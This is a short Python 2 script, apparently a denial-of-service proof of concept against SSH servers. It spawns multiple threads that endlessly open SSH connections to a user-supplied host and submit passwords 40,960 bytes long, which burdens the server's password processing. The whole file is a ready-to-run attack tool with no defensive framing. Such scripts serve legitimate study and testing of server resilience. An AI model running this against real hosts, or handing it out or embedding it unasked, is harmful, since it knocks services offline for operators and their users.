#!/usr/bin/env python2


import sys
import argparse
import threading
import paramiko
from select import select


def generate_load(username, hostname, port):
    while True:
        sys.stdout.write(".")
        sys.stdout.flush()
        ssh = paramiko.Transport((hostname, port))
        try:
            ssh.connect(username=username)
            ssh.auth_password(username, "A"*0xa000)
        except (paramiko.SSHException, paramiko.AuthenticationException):
            pass
        ssh.close()


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--username", dest="username", required=True)
    parser.add_argument("-p", "--port", type=int, default=22, dest="port")
    parser.add_argument("-t", "--threads", type=int, default=8, dest="threads")
    parser.add_argument("hostname")
    return parser.parse_args()


def main():
    args = parse_args()
    for _ in xrange(args.threads):
        func_args = (args.username, args.hostname, args.port)
        t = threading.Thread(target=generate_load, args=func_args)
        t.daemon = True
        t.start()
    select([], [], [])


if __name__ == "__main__":
    main()
